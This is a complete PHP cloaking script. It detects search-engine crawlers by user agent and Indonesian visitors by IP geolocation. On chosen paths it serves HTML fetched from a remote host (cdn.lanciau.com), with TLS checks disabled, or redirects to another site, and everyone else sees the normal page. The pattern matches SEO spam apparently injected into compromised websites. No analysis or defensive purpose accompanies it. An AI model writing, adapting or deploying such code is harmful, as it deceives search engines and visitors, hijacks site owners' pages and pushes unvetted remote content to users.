<?php

ob_start();

$config = [
    'bot_user_agents' => [
        'googlebot', 'slurp', 'adsense', 'inspection', 'ahrefs',
        'bingbot', 'baiduspider', 'duckduckbot', 'yandexbot',
        'facebot', 'google-inspectiontool', 'ia_archiver'
    ],
    'target_countries'  => ['ID'],
    'allowed_referers'  => ['google.com', 'google.co.id', 'bing.com', 'yahoo.com'],
    'ip_cache_ttl'      => 86400,
    'lp_cache_ttl'      => 3600,
    'cookie_ttl_days'   => 365,
    'cookie_name'       => 'cloak_status',
    'cache_directory'   => '/tmp/cache',

    'paths' => [
        '/lanciau/' => [
            'amp' => 'https://lanciau.com/',
            'lp'  => 'https://cdn.lanciau.com/content.txt',
        ],
        '/cibai-goreng/' => [
            'amp' => 'https://example.com/cb/',
            'lp'  => 'https://cdn.example.com/cb.txt',
        ],
        '/growtopia-handsome/' => [
            'amp' => 'https://example.com/gt/',
            'lp'  => 'https://cdn.example.com/gt.txt',
        ],
    ],
];

function get_client_ip(): string {
    $keys = [
        'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'
    ];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = trim(explode(',', $_SERVER[$key])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return '127.0.0.1';
}

function make_request(string $url) {
    if (!filter_var($url, FILTER_VALIDATE_URL) || !function_exists('curl_init')) {
        return false;
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT      => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ]);
    $data = curl_exec($ch);
    
    if (curl_errno($ch) || curl_getinfo($ch, CURLINFO_HTTP_CODE) !== 200) {
        curl_close($ch);
        return false;
    }
    
    curl_close($ch);
    return $data;
}

function get_ip_info(string $ip, array $config): array {
    $cache_dir = $config['cache_directory'];
    if (!is_dir($cache_dir)) @mkdir($cache_dir, 0777, true);

    $cache_file = $cache_dir . "/ip_" . md5($ip) . ".json";

    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $config['ip_cache_ttl'])) {
        return json_decode(file_get_contents($cache_file), true);
    }
    
    $geo_data = ['country' => 'UNKNOWN'];

    $response = make_request("https://ipinfo.io/{$ip}/json");
    $data_ipinfo = $response ? json_decode($response, true) : null;
    if (!empty($data_ipinfo['country'])) {
        $geo_data['country'] = trim($data_ipinfo['country']);
    } else {
        $response = make_request("http://ip-api.com/json/{$ip}");
        $data_ipapi = $response ? json_decode($response, true) : null;
        if (!empty($data_ipapi['countryCode'])) {
            $geo_data['country'] = trim($data_ipapi['countryCode']);
        }
    }
    
    file_put_contents($cache_file, json_encode($geo_data));
    return $geo_data;
}

$client_ip      = get_client_ip();
$user_agent     = strtolower($_SERVER['HTTP_USER_AGENT'] ?? 'null');
$referer        = $_SERVER['HTTP_REFERER'] ?? '';
$current_path   = parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH);
$path_config    = $config['paths'][$current_path] ?? null;
$is_target_path = $path_config !== null;
$cloak_cookie   = $_COOKIE[$config['cookie_name']] ?? null;

$is_bot             = (bool) preg_match('/' . implode('|', $config['bot_user_agents']) . '/i', $user_agent);
$is_from_referrer   = empty($config['allowed_referers']) ? false : (bool) preg_match('/' . implode('|', $config['allowed_referers']) . '/i', $referer);
$geo_info           = get_ip_info($client_ip, $config);
$is_from_target_geo = in_array($geo_info['country'], $config['target_countries']);

$should_cloak = $is_target_path && (
    ($is_bot) ||
    ($cloak_cookie === '1') ||
    ($is_from_target_geo) ||
    ($is_from_target_geo && $is_from_referrer)
);

if ($should_cloak) {
    if ($cloak_cookie !== '1') {
        setcookie($config['cookie_name'], '1', time() + ($config['cookie_ttl_days'] * 86400), "/");
    }

    $lp_url  = $path_config['lp']  ?? null;
    $amp_url = $path_config['amp'] ?? null;
    $content = false;

    if ($lp_url) {
        $lp_file = $config['cache_directory'] . "/lp_" . md5($lp_url) . ".html";
        if (file_exists($lp_file) && (time() - filemtime($lp_file) < $config['lp_cache_ttl'])) {
            $content = file_get_contents($lp_file);
        } else {
            $fetched = make_request($lp_url);
            if ($fetched && strlen(trim($fetched)) > 100) {
                file_put_contents($lp_file, $fetched);
                $content = $fetched;
            }
        }
    }

    if ($content) {
        ob_clean();
        header('Vary: Accept-Language, User-Agent');
        header('Content-Type: text/html; charset=utf-8');
        echo $content;
        ob_end_flush();
        exit;
    }

    if ($amp_url) {
        ob_clean();
        header('Location: ' . $amp_url, true, 302);
        exit;
    }
}

header('Vary: Accept-Language, User-Agent');

?>
